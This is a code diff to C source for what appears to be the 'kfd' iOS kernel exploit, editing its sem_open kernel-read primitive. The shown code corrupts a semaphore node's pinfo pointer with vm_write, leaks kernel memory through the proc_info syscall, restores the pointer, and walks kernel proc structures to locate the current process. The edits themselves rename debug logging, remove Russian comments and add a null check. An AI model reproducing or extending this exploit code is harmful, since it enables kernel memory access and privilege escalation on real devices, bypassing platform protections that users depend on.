@@ -46,10 +46,6 @@ void kread_sem_open_allocate(struct kfd* kfd, u64 id)
 
 bool kread_sem_open_search(struct kfd* kfd, u64 object_uaddr)
 {
-    /*
-     * arm64e: PUAF страницы PPL-owned — прямой доступ через volatile ptr
-     * вызывает SIGBUS (KERN_PROTECTION_FAILURE). Читаем через vm_read_overwrite.
-     */
     struct psemnode pnodes[4] = {};
     vm_size_t out_size = 0;
     kern_return_t kr = vm_read_overwrite(
@@ -80,19 +76,14 @@ bool kread_sem_open_search(struct kfd* kfd, u64 object_uaddr)
             u64 arg = fds[object_id];
             u64 buffer = (u64)(&data);
             i32 buffersize = (i32)(sizeof(struct psem_fdinfo));
-
             const u64 shift_amount = 4;
 
-            /*
-             * Пишем сдвинутый pinfo обратно через vm_write — безопасно на arm64e.
-             */
             u64 new_pinfo = pnodes[0].pinfo + shift_amount;
             vm_write(mach_task_self(), (vm_address_t)object_uaddr,
                      (vm_offset_t)&new_pinfo, sizeof(new_pinfo));
 
             assert(syscall(SYS_proc_info, callnum, pid, flavor, arg, buffer, buffersize) == buffersize);
 
-            /* Восстанавливаем оригинальный pinfo */
             vm_write(mach_task_self(), (vm_address_t)object_uaddr,
                      (vm_offset_t)&pnodes[0].pinfo, sizeof(pnodes[0].pinfo));
 
@@ -115,9 +106,6 @@ void kread_sem_open_kread(struct kfd* kfd, u64 kaddr, void* uaddr, u64 size)
 
 void kread_sem_open_find_proc(struct kfd* kfd)
 {
-    /*
-     * arm64e: читаем pnode->pinfo через vm_read_overwrite, не через volatile ptr.
-     */
     u64 pinfo = 0;
     vm_size_t out_size = 0;
     kern_return_t kr = vm_read_overwrite(
@@ -127,13 +115,13 @@ void kread_sem_open_find_proc(struct kfd* kfd)
         (vm_address_t)&pinfo,
         &out_size);
 
-    FILE *_dbg = fopen("/var/mobile/kfd_debug.log", "a");
-    if (_dbg) {
-        fprintf(_dbg, "[FIND_PROC] object_uaddr=0x%llx pinfo=0x%llx kr=%d our_pid=%d
-",
+    /* Диагностика */
+    FILE *_f1 = fopen("/var/mobile/kfd_debug.log", "a");
+    if (_f1) {
+        fprintf(_f1, "[FIND_PROC] uaddr=0x%llx pinfo=0x%llx kr=%d pid=%d\n",
                 (unsigned long long)kfd->kread.krkw_object_uaddr,
                 (unsigned long long)pinfo, kr, kfd->info.env.pid);
-        fclose(_dbg);
+        fclose(_f1);
     }
 
     if (kr != KERN_SUCCESS || !pinfo) return;
@@ -148,19 +136,20 @@ void kread_sem_open_find_proc(struct kfd* kfd)
     semaphore_kaddr = UNSIGN_PTR(semaphore_kaddr);
 
     u64 task_kaddr = 0;
-    kread((u64)(kfd),
-          semaphore_kaddr + offsetof(struct semaphore, owner),
-          &task_kaddr, sizeof(task_kaddr));
-    task_kaddr = UNSIGN_PTR(task_kaddr);
+    if (semaphore_kaddr) {
+        kread((u64)(kfd),
+              semaphore_kaddr + offsetof(struct semaphore, owner),
+              &task_kaddr, sizeof(task_kaddr));
+        task_kaddr = UNSIGN_PTR(task_kaddr);
+    }
 
-    FILE *_dbg2 = fopen("/var/mobile/kfd_debug.log", "a");
-    if (_dbg2) {
-        fprintf(_dbg2, "[FIND_PROC] pseminfo=0x%llx semaphore=0x%llx task=0x%llx
-",
+    FILE *_f2 = fopen("/var/mobile/kfd_debug.log", "a");
+    if (_f2) {
+        fprintf(_f2, "[FIND_PROC] pseminfo=0x%llx sem=0x%llx task=0x%llx\n",
                 (unsigned long long)pseminfo_kaddr,
                 (unsigned long long)semaphore_kaddr,
                 (unsigned long long)task_kaddr);
-        fclose(_dbg2);
+        fclose(_f2);
     }
 
     if (!task_kaddr) return;
@@ -175,21 +164,23 @@ void kread_sem_open_find_proc(struct kfd* kfd)
               &pid, sizeof(pid));
 
         if (iter < 5) {
-            FILE *_dbg3 = fopen("/var/mobile/kfd_debug.log", "a");
-            if (_dbg3) {
-                fprintf(_dbg3, "[FIND_PROC] iter=%llu proc=0x%llx pid=%d
-",
+            FILE *_f3 = fopen("/var/mobile/kfd_debug.log", "a");
+            if (_f3) {
+                fprintf(_f3, "[FIND_PROC] iter=%llu proc=0x%llx pid=%d\n",
                         (unsigned long long)iter,
                         (unsigned long long)proc_kaddr, pid);
-                fclose(_dbg3);
+                fclose(_f3);
             }
         }
 
         if (pid == kfd->info.env.pid) {
             kfd->info.kaddr.current_proc = proc_kaddr;
-            FILE *_dbg4 = fopen("/var/mobile/kfd_debug.log", "a");
-            if (_dbg4) { fprintf(_dbg4, "[FIND_PROC] FOUND current_proc=0x%llx
-", (unsigned long long)proc_kaddr); fclose(_dbg4); }
+            FILE *_f4 = fopen("/var/mobile/kfd_debug.log", "a");
+            if (_f4) {
+                fprintf(_f4, "[FIND_PROC] FOUND current_proc=0x%llx\n",
+                        (unsigned long long)proc_kaddr);
+                fclose(_f4);
+            }
             break;
         }
 
@@ -213,15 +204,11 @@ void kread_sem_open_free(struct kfd* kfd)
     kfd->kread.krkw_method_data = NULL;
 }
 
-/*
- * 64-bit kread — записываем новый pinfo через vm_write (безопасно на arm64e).
- */
 u64 kread_sem_open_kread_u64(struct kfd* kfd, u64 kaddr)
 {
     i32* fds = (i32*)(kfd->kread.krkw_method_data);
     i32 kread_fd = fds[kfd->kread.krkw_object_id];
 
-    /* Читаем текущий pinfo через vm_read_overwrite */
     u64 old_pinfo = 0;
     vm_size_t out_size = 0;
     vm_read_overwrite(mach_task_self(),
